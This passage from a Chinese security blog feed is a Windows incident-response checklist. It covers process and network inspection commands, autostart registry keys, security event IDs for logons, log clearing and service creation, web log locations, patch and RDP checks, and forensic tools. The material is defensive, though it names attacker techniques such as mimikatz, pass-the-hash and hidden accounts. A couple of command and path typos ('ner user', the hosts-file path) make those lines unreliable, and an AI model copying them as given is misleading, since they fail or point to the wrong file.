PID。</p><h4 id="2-网络连接与进程关联"><a href="#2-网络连接与进程关联" class="headerlink" title="2. 网络连接与进程关联"></a>2. 网络连接与进程关联</h4><ul><li><p><strong>查看网络连接状态</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano | findstr <span class="hljs-string">&quot;ESTABLISHED&quot;</span><br></code></pre></td></tr></table></figure><p>过滤已建立的连接，定位可疑IP和端口。</p></li><li><p><strong>通过PID关联进程</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svc | findstr <span class="hljs-string">&quot;PID&quot;</span><br></code></pre></td></tr></table></figure><p>根据网络连接中获取的PID，快速定位具体进程。</p></li></ul><h4 id="3-进程路径追踪与终止"><a href="#3-进程路径追踪与终止" class="headerlink" title="3. 进程路径追踪与终止"></a>3. 进程路径追踪与终止</h4><ul><li><strong>查看进程路径</strong>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic process <span class="hljs-built_in">where</span> processid=[PID] get executablepath,processid,name<br></code></pre></td></tr></table></figure></li></ul><p>获取进程的完整路径，判断是否为系统文件或可疑位置（如临时目录）。</p><ul><li><strong>终止进程</strong>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">taskkill /PID [PID] /F /T  <span class="hljs-comment"># /F 强制终止，/T 终止子进程</span><br></code></pre></td></tr></table></figure>强制终止进程及子进程，适用于顽固恶意进程。</li></ul><h3 id="进阶排查技巧（补充）"><a href="#进阶排查技巧（补充）" class="headerlink" title="进阶排查技巧（补充）"></a>进阶排查技巧（补充）</h3><h4 id="1-进程详细信息分析"><a href="#1-进程详细信息分析" class="headerlink" title="1. 进程详细信息分析"></a>1. 进程详细信息分析</h4><ul><li><p><strong>查看进程命令行参数</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic process get name,commandline,processid<br></code></pre></td></tr></table></figure><p>分析启动参数，识别异常参数（如加密字符串、远程URL）。</p></li><li><p><strong>进程启动时间检查</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic process get name,creationdate,processid | findstr [PID]<br></code></pre></td></tr></table></figure><p>对比系统正常进程的启动时间，定位异常时间段启动的进程。</p></li></ul><h4 id="2-进程关联资源排查"><a href="#2-进程关联资源排查" class="headerlink" title="2. 进程关联资源排查"></a>2. 进程关联资源排查</h4><ul><li><p><strong>查看进程加载的DLL</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /m [DLL名称]  <span class="hljs-comment"># 列出加载特定DLL的进程</span><br></code></pre></td></tr></table></figure><p>识别恶意注入的DLL（如无签名、名称随机）。</p></li><li><p><strong>检查进程线程状态</strong><br>使用工具（如 <strong>Process Explorer</strong>）查看线程的CPU占用、堆栈调用，定位高负载线程。</p></li></ul><h4 id="3-自动化工具推荐"><a href="#3-自动化工具推荐" class="headerlink" title="3. 自动化工具推荐"></a>3. 自动化工具推荐</h4><ul><li><p><strong>Process Explorer&#x2F;ProcessMonitor</strong>（微软官方工具）<br>提供图形化界面，显示进程树、线程、句柄、网络连接等详细信息，支持直接挂起&#x2F;终止进程。</p></li><li><p><strong>ProcessHacker&#x2F;OpenArk64</strong><br>检测隐藏进程、内核级恶意驱动，适用于对抗Rootkit。</p></li></ul><h3 id="排查流程优化建议"><a href="#排查流程优化建议" class="headerlink" title="排查流程优化建议"></a>排查流程优化建议</h3><ol><li><strong>网络连接优先</strong>：先通过 <code>netstat -ano</code> 定位异常连接，再关联进程PID。</li><li><strong>路径验证</strong>：检查进程路径是否在系统目录（如 <code>C:\Windows\System32</code>）或常见软件目录，排除伪装进程。</li><li><strong>父进程溯源</strong>：追踪PPID，判断是否为 <code>explorer.exe</code>、<code>svchost.exe</code> 等正常父进程。</li><li><strong>工具结合</strong>：命令行+图形化工具（如Process Explorer）结合使用，提高效率。</li></ol><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>权限要求</strong>：部分命令需管理员权限运行（如终止系统进程）。</li><li><strong>备份与记录</strong>：终止进程前记录详细信息，避免误操作影响系统。</li><li><strong>日志关联</strong>：结合系统日志（事件查看器）分析进程创建、服务启动等事件。</li><li><strong>杀软配合</strong>：使用杀毒软件（如D盾、火绒）扫描进程文件，确认是否为已知威胁。</li></ul><h1 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h1><blockquote><p><strong>注意：排查前记得打开显示隐藏文件</strong></p></blockquote><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript">临时文件排查<br>黑客往往可能将病毒放在临时目录（tmp/temp），或者将病毒相关文件释放到临时目录。<br>系统盘在C盘的情况下，则通常情况下的临时目录如下：<br>C:<span class="hljs-string">\Users\[用户名]\Local</span> Settings<span class="hljs-string">\Temp</span><br>C:<span class="hljs-string">\Documentsand</span> Settings<span class="hljs-string">\[用户名]\Local</span> Settings<span class="hljs-string">\Temp</span><br>C:<span class="hljs-string">\Users\[用户名]\桌面</span><br>C:<span class="hljs-string">\Documentsand</span> Settings<span class="hljs-string">\[用户名]\桌面</span><br>C:<span class="hljs-string">\Users\[用户名]\Local</span> Settings<span class="hljs-string">\Temporary</span> Internet Files<br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\[用户名]\Local</span> Settings<span class="hljs-string">\Temporary</span> Internet Files<br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">浏览器文件排查<br>黑客可能通过浏览器下载恶意文件，或者盗取用户信息，因此需要检查下浏览器的历史访问记录、文件下载记录、cookie信息，对应相关文件目录如下：<br>C:<span class="hljs-string">\Users\[用户名]\Cookies</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\[用户名]\Cookies</span><br>C:<span class="hljs-string">\Users\[用户名]\Local</span> Settings<span class="hljs-string">\History</span><br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\[用户名]\Local</span> Settings<span class="hljs-string">\History</span><br>C:<span class="hljs-string">\Users\[用户名]\Local</span> Settings<span class="hljs-string">\Temporary</span> Internet Files<br>C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\[用户名]\Local</span> Settings<span class="hljs-string">\Temporary</span> Internet Files<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">最近文件排查<br>Win+<span class="hljs-built_in">R</span> 输入recent<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">文件修改时间排查<br>可以根据文件夹内文件列表时间进行排序，查找可疑文件。一般情况下，修改时间越近的文件越可疑。<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">hosts文件排查<br>hosts文件是系统配置文件，用于本地DNS查询的域名设置，可以强制将某个域名对应到某个IP上，因此需要检查hosts文件有没有被黑客恶意篡改。<br><span class="hljs-name">C</span>:\Windows\System32\drivers\hosts<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">System</span>32是常见的病毒释放目录，因此需要重点检查该目录。特别注意用随机字符命名的文件夹和隐藏文件<br>C:\Windows\<span class="hljs-params">System</span>32<br></code></pre></td></tr></table></figure><h1 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h1><h2 id="注册表项排查"><a href="#注册表项排查" class="headerlink" title="注册表项排查"></a>注册表项排查</h2><h3 id="系统级启动项（所有用户生效）"><a href="#系统级启动项（所有用户生效）" class="headerlink" title="系统级启动项（所有用户生效）"></a>系统级启动项（所有用户生效）</h3><ol><li><strong>常规启动项</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>一次性启动项（仅运行一次后删除）</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>扩展一次性启动项（通常用于安装程序）</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx<br></code></pre></td></tr></table></figure><ol start="4"><li><strong>32位程序在64位系统中的启动项</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br></code></pre></td></tr></table></figure><h3 id="用户级启动项（仅当前用户生效）"><a href="#用户级启动项（仅当前用户生效）" class="headerlink" title="用户级启动项（仅当前用户生效）"></a>用户级启动项（仅当前用户生效）</h3><ol><li><strong>常规启动项</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>一次性启动项（仅运行一次后删除）</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>扩展一次性启动项</strong></li></ol><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx<br></code></pre></td></tr></table></figure><h3 id="其他相关路径"><a href="#其他相关路径" class="headerlink" title="其他相关路径"></a>其他相关路径</h3><ul><li><strong>组策略启动项</strong>（需管理员权限配置，通常影响系统级）</li></ul><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br></code></pre></td></tr></table></figure><p>步骤：</p><ol><li><p>按下 Win + R，输入 gpedit.msc，打开本地组策略编辑器。</p></li><li><p>导航至：计算机配置 &gt; Windows 设置 &gt; 脚本（启动&#x2F;关机）。</p></li></ol><h3 id="关键说明"><a href="#关键说明" class="headerlink" title="关键说明"></a>关键说明</h3><ul><li><strong>系统级（<code>HKEY_LOCAL_MACHINE</code>）</strong>：需要管理员权限修改，对所有用户生效。</li><li><strong>用户级（<code>HKEY_CURRENT_USER</code>）</strong>：仅影响当前登录用户。</li><li><strong>Run vs. RunOnce</strong><br>  <code>Run</code>：每次用户登录时自动启动。<br>  <code>RunOnce</code>：程序运行一次后，注册表项会被自动删除。常用于安装或配置任务。</li><li><strong>64位系统注意</strong>：64位系统会通过<code>WOW6432Node</code>区分32位程序，但常规路径（如<code>Run</code>）会同时加载64&#x2F;32位程序，无需额外配置。</li></ul><p>如果需要更直观的管理，也可使用系统工具：  </p><ul><li><strong>任务管理器</strong> → “启动”选项卡（适用于Windows 8及以上）。  </li><li><strong>系统配置工具</strong>（<code>msconfig</code>）或第三方工具（如Autoruns）。</li></ul><h2 id="启动文件排查"><a href="#启动文件排查" class="headerlink" title="启动文件排查"></a>启动文件排查</h2><h3 id="系统级启动目录（所有用户生效）"><a href="#系统级启动目录（所有用户生效）" class="headerlink" title="系统级启动目录（所有用户生效）"></a>系统级启动目录（所有用户生效）</h3><ol><li><strong>公共启动目录</strong></li></ol><ul><li>路径：<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br></code></pre></td></tr></table></figure></li><li>快速访问方法：<br>按下 <code>Win + R</code>，输入 <code>shell:common startup</code> 直接打开。</li></ul><h3 id="用户级启动目录（仅当前用户生效）"><a href="#用户级启动目录（仅当前用户生效）" class="headerlink" title="用户级启动目录（仅当前用户生效）"></a>用户级启动目录（仅当前用户生效）</h3><ol><li><strong>当前用户启动目录</strong></li></ol><ul><li>路径：  <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure></li><li>快速访问方法：<br>按下 <code>Win + R</code>，输入 <code>shell:startup</code> 直接打开。</li></ul><h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><ol><li><strong>兼容性差异</strong>：</li></ol><ul><li>上述路径适用于 Windows Vista&#x2F;7&#x2F;8&#x2F;10&#x2F;11，不同系统版本路径一致。  </li><li>在 Windows XP 中，路径为：<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\&lt;用户名&gt;\「开始」菜单\程序\启动`（系统级和用户级）</span><br></code></pre></td></tr></table></figure></li></ul><ol><li><strong>权限要求</strong>：</li></ol><ul><li>系统级目录（<code>ProgramData</code>）需要管理员权限才能修改。  </li><li>用户级目录可直接通过当前用户账户修改。</li></ul><ol start="2"><li><strong>隐藏文件夹</strong>：</li></ol><ul><li><code>AppData</code> 和 <code>ProgramData</code> 是隐藏文件夹，需在资源管理器中启用 <strong>“显示隐藏的文件”</strong> 才能看到。</li></ul><h1 id="系统日志排查"><a href="#系统日志排查" class="headerlink" title="系统日志排查"></a>系统日志排查</h1><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">windows日志文件保存位置：<span class="hljs-name">C</span>:\Windows\System32\winevt\Logs<br></code></pre></td></tr></table></figure><h2 id="一、登录相关事件"><a href="#一、登录相关事件" class="headerlink" title="一、登录相关事件"></a>一、登录相关事件</h2><ol><li><strong>4624</strong>（登录成功）</li></ol><ul><li><strong>描述</strong>：记录用户成功登录系统的事件。  </li><li><strong>关键字段</strong>：  </li><li><strong>登录类型</strong>（如类型3为网络登录，类型10为远程桌面登录）  </li><li><strong>源IP</strong>（用于追踪登录来源）  </li><li><strong>应用场景</strong>：排查异常时间或陌生IP的成功登录行为。</li></ul><ol start="2"><li><strong>4625</strong>（登录失败）</li></ol><ul><li><strong>描述</strong>：记录用户登录失败的事件，如密码错误或账户不存在。  </li><li><strong>关键字段</strong>：  </li><li><strong>失败原因</strong>（如<code>0xC000006D</code>表示用户名错误，<code>0xC000006A</code>表示密码错误）  </li><li><strong>登录进程</strong>（如<code>NTLM</code>或<code>Kerberos</code>）  </li><li><strong>应用场景</strong>：检测暴力破解攻击或异常账户探测。</li></ul><ol start="3"><li><strong>4648</strong>（显式凭证登录）</li></ol><ul><li><strong>描述</strong>：用户使用<code>runas</code>或其他方式显式提供凭证登录（如横向渗透中传递票据）。  </li><li><strong>关键字段</strong>：  </li><li><strong>进程名</strong>（如<code>cmd.exe</code>或<code>powershell.exe</code>）  </li><li><strong>目标用户名</strong>（如提权操作的目标账户）  </li><li><strong>应用场景</strong>：发现横向移动或特权提升行为。</li></ul><ol start="4"><li><strong>4672</strong>（特权用户登录）</li></ol><ul><li><strong>描述</strong>：用户以管理员权限登录（如<code>Administrator</code>账户）。  </li><li><strong>应用场景</strong>：监控高权限账户的异常活动。</li></ul><h2 id="二、账户管理事件"><a href="#二、账户管理事件" class="headerlink" title="二、账户管理事件"></a>二、账户管理事件</h2><ol><li><strong>4720</strong>（创建用户）</li></ol><ul><li><strong>描述</strong>：系统中新增本地或域用户。  </li><li><strong>应用场景</strong>：检测攻击者创建隐藏账户（如<code>admin$</code>）。</li></ul><ol start="2"><li><strong>4724</strong>（重置密码）</li></ol><ul><li><strong>描述</strong>：用户密码被修改。  </li><li><strong>应用场景</strong>：排查未经授权的密码变更行为。</li></ul><ol start="3"><li><strong>4726</strong>（删除用户）</li></ol><ul><li><strong>描述</strong>：用户账户被删除。  </li><li><strong>应用场景</strong>：识别攻击者清除痕迹的操作。</li></ul><ol start="4"><li><strong>4732</strong>（用户加入本地组）</li></ol><ul><li><strong>描述</strong>：用户被添加到管理员组或其他特权组。  </li><li><strong>应用场景</strong>：检测提权行为（如将普通用户加入<code>Administrators</code>组）。</li></ul><h2 id="三、进程与服务相关事件"><a href="#三、进程与服务相关事件" class="headerlink" title="三、进程与服务相关事件"></a>三、进程与服务相关事件</h2><ol><li><strong>4688</strong>（进程创建）</li></ol><ul><li><strong>描述</strong>：记录新进程的启动，包括路径、命令行参数和父进程。  </li><li><strong>应用场景</strong>：发现恶意进程（如<code>C:\temp\mimikatz.exe</code>）或异常命令行操作。</li></ul><ol start="2"><li><strong>7045</strong>（服务创建）</li></ol><ul><li><strong>描述</strong>：系统中新增服务项。  </li><li><strong>应用场景</strong>：检测后门服务（如攻击者通过服务实现持久化）。</li></ul><h2 id="四、日志操作与系统变更"><a href="#四、日志操作与系统变更" class="headerlink" title="四、日志操作与系统变更"></a>四、日志操作与系统变更</h2><ol><li><strong>104</strong>（日志清除）</li></ol><ul><li><strong>描述</strong>：系统日志被清空（如使用<code>wevtutil</code>工具）。  </li><li><strong>应用场景</strong>：识别攻击者清除痕迹的行为。</li></ul><ol start="2"><li><strong>1102</strong>（审计日志清除）</li></ol><ul><li><strong>描述</strong>：安全日志被手动清除。  </li><li><strong>应用场景</strong>：同104，但针对安全日志。</li></ul><ol start="3"><li><strong>4697</strong>（服务安装）</li></ol><ul><li><strong>描述</strong>：系统安装新服务。  </li><li><strong>应用场景</strong>：监控恶意服务的植入。</li></ul><h2 id="五、其他关键事件"><a href="#五、其他关键事件" class="headerlink" title="五、其他关键事件"></a>五、其他关键事件</h2><ol><li><strong>4776</strong>（NTLM认证尝试）</li></ol><ul><li><strong>描述</strong>：记录NTLM协议的认证请求（如暴力破解或Pass-the-Hash攻击）。  </li><li><strong>关键字段</strong>：  </li><li><strong>源工作站名</strong>（如<code>localhost</code>可能为本地攻击）  </li><li><strong>错误代码</strong>（如<code>0xC0000064</code>表示账户不存在）  </li><li><strong>应用场景</strong>：检测横向移动或凭证窃取。</li></ul><ol start="2"><li><strong>5140</strong>（网络共享访问）</li></ol><ul><li><strong>描述</strong>：用户访问网络共享文件或目录。  </li><li><strong>应用场景</strong>：追踪横向渗透中的文件窃取行为。</li></ul><p><strong>建议</strong>：日常排查时可优先关注<strong>登录事件（4624&#x2F;4625）</strong>、<strong>账户变更（4720&#x2F;4726）</strong>和<strong>进程创建（4688）</strong>，结合源IP、时间戳和进程路径进行关联分析。若需完整事件ID列表，可参考微软官方文档或安全日志分析工具。</p><h1 id="Web日志排查"><a href="#Web日志排查" class="headerlink" title="Web日志排查"></a>Web日志排查</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Apache日志：<br>apache日志一般分为access<span class="hljs-emphasis">_log 和 error_log两种：</span><br><span class="hljs-emphasis">access_log记录对apache服务器的请求访问</span><br><span class="hljs-emphasis">error_</span>log记录错误请求，服务器错误<br>存放路径：/apache/logs/<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">nginx日志：<br>ngnix日志一般分为access.<span class="hljs-built_in">log</span>和<span class="hljs-keyword">error</span>.<span class="hljs-built_in">log</span>两种：<br>access.<span class="hljs-built_in">log</span> 主要记录访问日志<br><span class="hljs-keyword">error</span>.<span class="hljs-built_in">log</span> 主要记录一些错误信息<br>存放路径/Nginx/logs/<br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">IIS日志：<br>存放路径c:<span class="hljs-string">\windows\system32\logFiles</span><br></code></pre></td></tr></table></figure><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Tomact日志：<br>tomcat日志一般分为catalina.<span class="hljs-keyword">out</span>、localhost、manager、localhost_access_log4种格式日志：<br>catalina.<span class="hljs-keyword">out</span>主要记录运行中残生的信息，如异常错误等<br>localhost.Y-M-D.<span class="hljs-built_in">log</span> 内部代码丢出的异常日志<br>manager.Y-M-D.<span class="hljs-built_in">log</span> 管理日志<br>localhost_access_log 访问日志信息，访问时间、ip地址等<br>存放路径/tomcat/logs<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Weblogic日志：<br><span class="hljs-keyword">access</span>.<span class="hljs-keyword">log</span>主要记录http请求<br><span class="hljs-keyword">server</span> <span class="hljs-keyword">log</span> 主要记录weblogic启动、关闭、部署等相关信息<br><span class="hljs-keyword">domain</span> <span class="hljs-keyword">log</span> 主要记录weblogic <span class="hljs-keyword">server</span> 的doain运行情况<br></code></pre></td></tr></table></figure><h1 id="账号排查"><a href="#账号排查" class="headerlink" title="账号排查"></a>账号排查</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">查看所有用户最后一次登录，修改密码时间，以及账户是否启动：ner <span class="hljs-keyword">user</span> <span class="hljs-title">用户名</span><br><span class="hljs-title">隐藏/克隆账号排查：使用D</span>盾进行扫描<br>可疑账号排查：Win+R 输入lusrmgr.msc（关注管理员群组是否存在可疑账号）<br>排查在线用户：query user<br></code></pre></td></tr></table></figure><h1 id="补丁排查"><a href="#补丁排查" class="headerlink" title="补丁排查"></a>补丁排查</h1><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">查看系统补丁信息：systeminfo（重点关注MS08<span class="hljs-string">-067</span>、MS09<span class="hljs-string">-001</span>、MS17<span class="hljs-string">-010</span>）<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">MS17-<span class="hljs-number">010</span>补丁：<br>Win7/Win2008R2：KB<span class="hljs-number">4012212</span>、KB<span class="hljs-number">4012215</span><br>Win2012R2：KB<span class="hljs-number">4012213</span>、KB<span class="hljs-number">4012216</span><br>Win2016： KB<span class="hljs-number">4013429</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS08</span>-<span class="hljs-number">067</span>补丁：KB958644<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS09</span>-<span class="hljs-number">001</span>补丁：KB958687<br></code></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看IPV4路由信息：netstat -rn<br>查看DNS解析缓存：ipconfig /displaydns<br></code></pre></td></tr></table></figure><h1 id="rdp远程连接记录排查"><a href="#rdp远程连接记录排查" class="headerlink" title="rdp远程连接记录排查"></a>rdp远程连接记录排查</h1><pre><code class="hljs">注册表排查</code></pre><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">检查当前用户使用RDP连接过的主机IP：<br>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers<br></code></pre></td></tr></table></figure><pre><code class="hljs">查看UsernameHint键值为远程登录的用户名</code></pre><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">RDP服务启用状态排查：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<br>检查fDenyTSConnections 键值，键值为<span class="hljs-number">0</span>表示已开启远程桌面，键值为<span class="hljs-number">1</span>表示已关闭远程桌面<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">RDP远程端口排查：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>检查PortNumber键值，若为<span class="hljs-number">3389</span>则正常<br></code></pre></td></tr></table></figure><p>更多信息参考文献：<a href="https://zhuanlan.zhihu.com/p/240184708">https://zhuanlan.zhihu.com/p/240184708</a></p><h1 id="排查工具"><a href="#排查工具" class="headerlink" title="排查工具"></a>排查工具</h1><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">系统日志分析工具：evtxLogparse1.<span class="hljs-number">3</span>/LogParser<br>显Windows程序历史记录：userassistview<br>查看最近电脑的使用操作记录：LastActivityView (<span class="hljs-number">0.236</span>, <span class="hljs-number">0.029</span>, <span class="hljs-number">14.01</span><span class="hljs-comment">%)</span><br>查看浏览器历史记录：browsinghistoryview<br>查看进程：PCHunter/ProcessHacker<br>查看启动项：Autoruns<br></code></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.freebuf.com/articles/es/210315.html">https://www.freebuf.com/articles/es/210315.html</a></p><p><a href="https://www.freebuf.com/articles/network/178677.html">https://www.freebuf.com/articles/network/178677.html</a></p><p>web日志文件分析：<a href="https://blog.csdn.net/qq_25645753/article/details/111170854">https://blog.csdn.net/qq_25645753/article/details/111170854</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口转发</title>
    <link href="/2024/05/14/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2024/05/14/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
